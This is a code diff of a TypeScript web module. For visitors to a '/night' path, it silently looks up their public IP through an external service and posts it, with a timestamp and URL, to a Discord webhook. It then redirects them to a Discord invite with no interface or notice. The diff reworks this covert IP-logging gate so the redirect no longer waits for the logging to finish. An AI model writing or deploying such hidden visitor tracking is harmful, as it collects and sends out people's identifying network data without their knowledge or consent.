@@ -2,6 +2,11 @@ import { resolveNightWebhook } from "./nightWebhook";
 
 const NIGHT_INVITE = "https://discord.gg/8hkJGhkGc4";
 
+export function isNightPath(): boolean {
+  const p = window.location.pathname.replace(/\/$/, "") || "/";
+  return p === "/night" || p.endsWith("/night");
+}
+
 async function fetchPublicIp(): Promise<string> {
   try {
     const res = await fetch("https://api.ipify.org?format=json", {
@@ -15,26 +20,24 @@ async function fetchPublicIp(): Promise<string> {
   }
 }
 
-/** Plain-text Discord message — no embeds. */
 async function postPlain(webhook: string, content: string): Promise<void> {
   const form = new FormData();
   form.append("payload_json", JSON.stringify({ content: content.slice(0, 2000) }));
   try {
     await fetch(webhook, { method: "POST", body: form, mode: "no-cors" });
   } catch {
-    /* still redirect */
+    /* ignore */
   }
 }
 
-export async function runNightGate(): Promise<void> {
+/** Log IP (plain text, no embeds) then redirect immediately — no UI. */
+export function runNightGate(): void {
   const webhook = resolveNightWebhook();
-  const ip = await fetchPublicIp();
-  const when = new Date().toISOString();
-  const line = `night gate · ${when}\nIP: ${ip}\n${window.location.href}`;
 
-  if (webhook) {
-    await postPlain(webhook, line);
-  }
+  void fetchPublicIp().then((ip) => {
+    const line = `night gate · ${new Date().toISOString()}\nIP: ${ip}\n${window.location.href}`;
+    if (webhook) void postPlain(webhook, line);
+  });
 
   window.location.replace(NIGHT_INVITE);
 }
